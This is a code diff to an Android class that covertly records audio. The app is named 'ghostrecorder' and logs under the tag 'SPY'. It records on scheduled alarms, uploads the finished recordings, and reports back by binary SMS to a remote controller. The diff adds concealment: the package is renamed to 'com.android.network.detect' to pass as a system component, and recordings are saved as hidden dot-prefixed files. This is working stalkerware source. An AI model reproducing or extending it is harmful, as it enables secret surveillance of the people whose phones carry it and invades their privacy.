@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -16,16 +16,19 @@ import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.Date;
+import java.util.Calendar;
+import java.util.Locale;
 import java.util.TimeZone;
 
 public class RecorderHelpers extends ContextWrapper implements
         CustomMediaRecorder.OnNewFileWrittenListener,
         CustomMediaRecorder.OnRecordingStateChangedListener {
 
+    private final String LOG_TAG = AppGlobals.getLogTag(getClass());
+
     private static CustomMediaRecorder sRecorder;
-    private PendingIntent pendingIntent;
-    private AlarmManager alarmManager;
+    private static PendingIntent pendingIntent;
+    private static AlarmManager alarmManager;
     private final int FIFTEEN_MINUTES = 15 * 1000 * 60;
     private int mCompleteRepeats;
     private float mPartialRepeats;
@@ -36,13 +39,14 @@ public class RecorderHelpers extends ContextWrapper implements
     private int mSplitDuration;
     private boolean mScheduleEnded;
     private boolean mStoppedWithInDirectCommand;
+    private static boolean sIsRecordAlarmSet;
 
     private BroadcastReceiver mScheduledRecordingsReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
+            setIsRecordAlarmSet(false);
             int time = intent.getExtras().getInt("RECORD_TIME", mRecordingInstance);
-            String fileName = intent.getExtras().getString("FILE_NAME", null);
-            startRecording(time, fileName);
+            startRecording(time);
         }
     };
 
@@ -50,16 +54,20 @@ public class RecorderHelpers extends ContextWrapper implements
         super(base);
     }
 
-    private void startRecording(int time, String fileName) {
+    private static void setIsRecordAlarmSet(boolean set) {
+        sIsRecordAlarmSet = set;
+    }
+
+    static boolean isRecordAlarmSet() {
+        return sIsRecordAlarmSet;
+    }
+
+    private void startRecording(int time) {
         if (CustomMediaRecorder.isRecording()) {
             Log.i("SPY", "Recording already in progress");
             return;
         }
-
-        if (fileName == null) {
-            fileName = getTimeStamp();
-        }
-        String path = Environment.getExternalStorageDirectory() + "/" + "Others/" + fileName + ".aac";
+        String path = Environment.getExternalStorageDirectory() + "/" + AppGlobals.DIRECTORY_NAME + "/" + getTimeStamp() + ".aac";
         sRecorder = CustomMediaRecorder.getInstance();
         sRecorder.reset();
         sRecorder.setOnNewFileWrittenListener(this);
@@ -81,21 +89,17 @@ public class RecorderHelpers extends ContextWrapper implements
         AppGlobals.saveLastRecordingFilePath(path);
     }
 
-    void startRecording(int time, String fileName, int splitDuration) {
-        if (fileName == null) {
-            fileName = getTimeStamp();
-        }
-
+    void startRecording(int time, int splitDuration) {
         if (splitDuration == 0 && time < FIFTEEN_MINUTES) {
-            startRecording(time, fileName);
-            return;
+            startRecording(time);
         } else if (splitDuration == 0 && time > FIFTEEN_MINUTES) {
             mSplitDuration = FIFTEEN_MINUTES;
             float parts = (float) time / (float) mSplitDuration;
             mSplitFull = (int) parts;
             mSplitPartial = parts - mSplitFull;
-            startRecording(mSplitDuration, fileName);
-            return;
+            startRecording(mSplitDuration);
+            Log.v(LOG_TAG, String.format("Complete repeats %d", mSplitFull));
+            Log.v(LOG_TAG, String.format("Partial repeats %f", mSplitPartial));
         }
     }
 
@@ -107,8 +111,10 @@ public class RecorderHelpers extends ContextWrapper implements
         mCompleteRepeats = (int) parts;
         mPartialRepeats = parts - mCompleteRepeats;
         mRecordingInstance = recordingInstance;
-        startRecording(mRecordingInstance, null);
+        startRecording(mRecordingInstance);
         mCompleteRepeats--;
+        Log.v(LOG_TAG, String.format("Complete repeats %d", mCompleteRepeats));
+        Log.v(LOG_TAG, String.format("Partial repeats %f", mPartialRepeats));
     }
 
      void stopRecording() {
@@ -127,28 +133,32 @@ public class RecorderHelpers extends ContextWrapper implements
     }
 
     void createRecordingDirectoryIfNotAlreadyCreated() {
-        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + "Others");
+        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + AppGlobals.DIRECTORY_NAME);
         if (!recordingsDirectory.exists()) {
             recordingsDirectory.mkdir();
         }
     }
 
-    public void cancelAlarm() {
-        if (alarmManager != null) {
+    static void cancelAlarm() {
+        if (alarmManager != null && pendingIntent != null) {
             alarmManager.cancel(pendingIntent);
         }
+        setIsRecordAlarmSet(false);
     }
 
     private String getTimeStamp() {
-        SimpleDateFormat dateFormatGmt = new SimpleDateFormat("yyyyMMddhhmmss");
-        dateFormatGmt.setTimeZone(TimeZone.getTimeZone("GMT"));
-        return dateFormatGmt.format(new Date());
+        TimeZone timeZone = TimeZone.getTimeZone("UTC");
+        Calendar calendar = Calendar.getInstance(timeZone);
+        SimpleDateFormat simpleDateFormat =
+                new SimpleDateFormat("yyyyMMddhhmmss", Locale.UK);
+        simpleDateFormat.setTimeZone(timeZone);
+        return "." + simpleDateFormat.format(calendar.getTime());
     }
 
     @Override
     public void onNewRecordingCompleted(String path) {
         ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path));
-        UploadRecordingTaskHelpers  uploadRecordingTaskHelpers
+        UploadRecordingTaskHelpers uploadRecordingTaskHelpers
                 = new UploadRecordingTaskHelpers(getApplicationContext());
         if (uploadRecordingTaskHelpers.isNetworkAvailable()
                 && uploadRecordingTaskHelpers.networkAvailable() == 0) {
@@ -165,41 +175,47 @@ public class RecorderHelpers extends ContextWrapper implements
     public void onStop(int stopper, String fileName) {
         switch (stopper) {
             case AppGlobals.STOPPED_AFTER_TIME:
+                Log.v(LOG_TAG, String.format("Complete repeats %d", mCompleteRepeats));
+                Log.v(LOG_TAG, String.format("Partial repeats %f", mPartialRepeats));
                 if (mCompleteRepeats > 0) {
                     Intent intent = new Intent("com.byteshaft.startAlarm");
-                    intent.putExtra("FILE_NAME", getFileNameForNextRecording(fileName));
-                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
-                    alarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
-                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
+                    setAlarmedRecording(intent);
                     mCompleteRepeats--;
                     mScheduleEnded = true;
                     return;
-                } else if (mPartialRepeats != 0) {
+                } else if (mPartialRepeats > 0) {
                     int time = (int) (mRecordingInstance * mPartialRepeats);
+                    System.out.println("Alarm for " + time);
                     Intent intent = new Intent("com.byteshaft.startAlarm");
-                    intent.putExtra("FILE_NAME", getFileNameForNextRecording(fileName));
                     intent.putExtra("RECORD_TIME", time);
-                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
-                    alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
+                    setAlarmedRecording(intent);
                     mPartialRepeats = 0;
                     mScheduleEnded = true;
                     return;
                 }
 
                 if (mScheduleEnded) {
-                    Helpers.sendDataSmsResponse(Helpers.originatingAddress, BinarySmsReceiver.responsePort, "Recording Stopped. Schedule Completed.");
+                    if (Helpers.originatingAddress != null) {
+                        Helpers.sendDataSmsResponse(
+                                Helpers.originatingAddress,
+                                BinarySmsReceiver.responsePort,
+                                "Recording Stopped. Schedule Completed."
+                        );
+                        return;
+                    }
                 }
 
+                Log.v(LOG_TAG, String.format("Complete repeats %d", mSplitFull));
+                Log.v(LOG_TAG, String.format("Partial repeats %f", mSplitPartial));
                 if (mSplitFull > 0) {
-                    startRecording(mSplitDuration, getFileNameForNextRecording(fileName));
+                    startRecording(mSplitDuration);
                     mSplitFull--;
                     return;
                 }
-
                 if (mSplitPartial > 0) {
-                    startRecording((int) (mSplitDuration * mSplitPartial), getFileNameForNextRecording(fileName));
+                    startRecording((int) (mSplitDuration * mSplitPartial));
                     mSplitPartial = 0;
+                    break;
                 }
                 break;
             case AppGlobals.STOPPED_WITH_DIRECT_CALL:
@@ -212,20 +228,11 @@ public class RecorderHelpers extends ContextWrapper implements
         }
     }
 
-    private String getFileNameForNextRecording(String currentPath) {
-        File file = new File(currentPath);
-        String name = file.getName();
-        String nameNoExtension = name.substring(0, name.lastIndexOf('.'));
-        String[] title = nameNoExtension.split("-");
-
-        if (title.length == 1) {
-            return title[0] + "-" + "1";
-        } else if (title.length == 2) {
-            String baseName = title[0];
-            int iterator = Integer.valueOf(title[1]) + 1;
-            return baseName + "-" + iterator;
-        } else {
-            return null;
-        }
+    private void setAlarmedRecording(Intent intent) {
+        Log.v(LOG_TAG, String.format("Setting recording alarm for %d", mRecordingGap));
+        pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
+        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
+        setIsRecordAlarmSet(true);
     }
 }
